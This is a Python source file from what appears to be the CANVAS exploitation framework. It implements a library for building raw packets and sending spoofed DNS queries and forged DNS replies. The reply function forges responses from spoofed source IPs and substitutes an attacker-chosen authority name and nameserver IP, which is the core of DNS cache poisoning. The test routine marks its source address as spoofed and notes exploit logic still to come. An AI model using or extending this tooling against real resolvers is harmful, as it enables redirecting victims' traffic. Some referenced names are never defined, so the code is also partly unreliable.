#!/usr/bin/env python

"""

cdns.py

CANVAS DNS library

"""

import sys
if "." not in sys.path: sys.path.append(".")
import exploitutils
import random
#some other stuff was moved to sniffer.py - fix this at some point
from sniffer import sender, packetConstructor, init_gateway_iface, ip2iface
import socket


class DNS(object):
    def __init__(self, logger=None):
        if logger:
            self.log=logger
        self.txid=0 #default for replies (we set this when we send a request)
        self.dns_replies=[]
        self.dns_requests=[]
        try:
            self.mysender = sender("eth0")
        except socket.error:
            self.log("Cannot use raw socket!")
        return

    def log(self, msg):
        """
        Default logger for this class
        """
        print msg
        return


    def make_dns_replies(self, txid, dest_port, name, sources, target, authorityname, response_ip):
        """
        Sends DNS reples from sources ( a list of IP's) to target

        authority_name is the new name of their IP server
        response_ip is the new IP of their name server
        """

        for source in sources:
            real_ip=exploitutils.get_source_ip(target)
            if real_ip==None:
                self.log("You have no default gateway for target ip %s"%target)
                self.log("Cannot continue - exiting")
                return
            iface=ip2iface[real_ip] #actual ip->interface mapping done here so we know our gateway
            try:
                self.mysender = sender(iface)
            except socket.error:
                self.log("Cannot use raw socket!")
                return

            gateway=gateway_from_iface.get(iface,None)
            if not gateway:
                #self.log("No gateway found, must be on local network")
                dest_mac_address=mac_from_ip.get(target)
                if not dest_mac_address:
                    self.log("Cannot get mac address for %s - perhaps ping it to add it to arp cache?"%target)
                    return
                else:
                    #self.log("dest_mac_address=%s"%dest_mac_address)
                    pass
            else:
                #self.log("Gateway found: %s"%gateway)
                dest_mac_address=mac_from_ip.get(gateway)
                if dest_mac_address==None:
                    self.log("Cannot find destination mac address for %s"%gateway)
                    return

            dnsconstructor=packetConstructor()
            dnsconstructor.DNSResponse(txid, name, authorityname, response_ip )
            dnsdata=dnsconstructor.get()
            udpconstructor=packetConstructor()
            udpconstructor.UDP( source, target, 53, dest_port, dnsdata )
            udpdata=udpconstructor.get()

            myconstructor=packetConstructor()
            eth_header = myconstructor.Ethernet(self.mysender.hardware_address,dest_mac_address,"IP")
            ip_packet  = myconstructor.IP( source, target, udpdata)

            data=myconstructor.get()
            self.dns_replies+=[data]
            #print "Data: %s"%(data.encode("HEX"))
        return

    def send_dns_requests(self):
        for request in self.dns_requests:
            self.mysender.send( request, "IP" )
        return

    def send_dns_replies(self):
        for reply in self.dns_replies:
            self.mysender.send( reply, "IP" )
        self.dns_requests=[] #clear this here to save time earlier
        self.dns_replies=[] #clear this
        return

    def make_dns_request(self, source, target, name ):
        """
        Sends a DNS Query to our target
        """

        real_ip=exploitutils.get_source_ip(target)
        if real_ip==None:
            self.log("You have no default gateway for target ip %s"%target)
            self.log("Cannot continue - exiting")
            return
        iface=ip2iface[real_ip] #actual ip->interface mapping done here so we know our gateway
        try:
            self.mysender = sender(iface)
        except socket.error:
            self.log("Cannot use raw socket!")
            return

        gateway=gateway_from_iface.get(iface,None)
        if not gateway:
            #self.log("No gateway found, must be on local network")
            dest_mac_address=mac_from_ip.get(target)
            if not dest_mac_address:
                self.log("Cannot get mac address for %s - perhaps ping it to add it to arp cache?"%target)
                return
            else:
                #self.log("dest_mac_address=%s"%dest_mac_address)
                pass
        else:
            #self.log("Gateway found: %s"%gateway)
            dest_mac_address=mac_from_ip.get(gateway)
            if dest_mac_address==None:
                self.log("Cannot find destination mac address for %s"%gateway)
                return


        dnsconstructor=packetConstructor()
        txid=random.randint(1,65535)
        self.txid=txid
        dnsconstructor.DNSQuery(txid, name)
        dnsdata=dnsconstructor.get()
        udpconstructor=packetConstructor()
        udp_source_port=random.randint(1,65535)
        udpconstructor.UDP( source, target, udp_source_port, 53, dnsdata )
        udpdata=udpconstructor.get()

        myconstructor=packetConstructor()
        eth_header = myconstructor.Ethernet(self.mysender.hardware_address,dest_mac_address,"IP")
        ip_packet  = myconstructor.IP( source, target, udpdata)

        data=myconstructor.get()
        #print "Data: %s"%(data.encode("HEX"))
        self.dns_requests+=[data]
        return

def main():
    """
    testing function
    """

    #must get this interface right...
    """
    TODO:
    2. Create exploit logic
    3. Threading.
    """
    source="10.71.7.54" #spoofed
    target="10.61.32.1"
    name="www.cow.com"
    init_gateway_iface()

    mydns=DNS()
    mydns.make_dns_request(source, target, name)
    txid=1
    mydns.make_dns_replies(txid, 53, name, [source],target,"q.cow.com","192.168.1.1")

if __name__=="__main__":
    main()
